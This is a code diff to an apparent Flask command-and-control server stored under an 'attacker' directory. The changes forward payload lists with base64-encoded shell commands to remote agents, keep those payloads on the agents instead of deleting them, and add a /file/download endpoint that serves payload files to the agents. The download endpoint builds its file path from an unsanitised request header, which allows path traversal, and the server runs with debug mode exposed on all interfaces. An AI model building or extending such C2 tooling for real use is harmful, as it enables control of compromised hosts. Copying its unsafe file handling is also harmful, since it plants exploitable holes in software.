@@ -100,6 +100,7 @@ def send_command():
         json_data = json.loads(data)
         agent = json_data.get("agent")
         command = json_data.get("command")
+        payloads = json_data.get("payloads", [])
 
         if not agent or not command:
             return jsonify({"error": "Missing agent or command"}), 400
@@ -113,8 +114,9 @@ def send_command():
             command=encode_base64(command),
             executor="sh",
             timeout=60,
-            payloads=[],
+            payloads=payloads,
             uploads=[],
+            delete_payload=False,
         )
         command = Command(
             id=command_id,
@@ -145,3 +147,33 @@ def check_command_status(command_id):
 
     command = command_results[command_id]
     return jsonify(command.model_dump())
+
+
+# Download file
+@app.route("/file/download", methods=["POST"])
+def download():
+    try:
+        file_name = request.headers.get("File")
+
+        if not file_name:
+            return jsonify({"error": "Missing file name"}), 400
+
+        file_path = f"/attacker/c2_server/payloads/{file_name}"
+        with open(file_path, "rb") as f:
+            file_data = f.read()
+
+        headers = {
+            "Content-Disposition": f'attachment; filename="{file_name}"',
+            "FILENAME": file_name,
+        }
+
+        return file_data, 200, headers
+
+    except FileNotFoundError:
+        return jsonify({"error": "File not found"}), 404
+    except Exception as e:
+        return jsonify({"error": f"Internal server error: {str(e)}"}), 500
+
+
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=8888, debug=True)
